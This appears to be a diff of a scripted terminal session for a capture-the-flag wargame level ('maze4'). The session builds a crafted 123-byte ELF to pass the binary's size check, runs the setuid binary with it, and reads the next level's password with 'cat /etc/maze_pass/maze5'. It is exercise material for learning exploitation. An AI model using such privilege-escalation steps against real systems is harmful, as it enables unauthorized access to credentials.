@@ -4,7 +4,7 @@
 @line mkdir -p /run/screen/l4 && cd /run/screen/l4
 @line cp /bin/sh ./sh
 @line chmod 755 ./sh
-@vi tinel.py
+@vim tinel.py
 # tinel.py - build a 123-byte i386 ELF that passes maze4's stat-then-exec gate.
 #
 # maze4 gate (gdb-verified): read(52)->bufA, lseek to dword(bufA+28), read(32)->bufB,
@@ -66,17 +66,12 @@ data += b"\x00" * (123 - len(data))  # pad to exactly 123 (size gate: <= 0x7b)
 assert len(data) == 123
 open(sys.argv[1], "wb").write(data)
 print("wrote", len(data), "bytes")
-
 @viend
 @line python3 tinel.py tiny
 @line chmod 755 tiny
 @line xxd tiny | head -6
 @line /maze/maze4 tiny
-@sleep 2
 @line id
-@sleep 2
 @line cat /etc/maze_pass/maze5
-@sleep 2
 @line exit
-@sleep 2
 @line exit
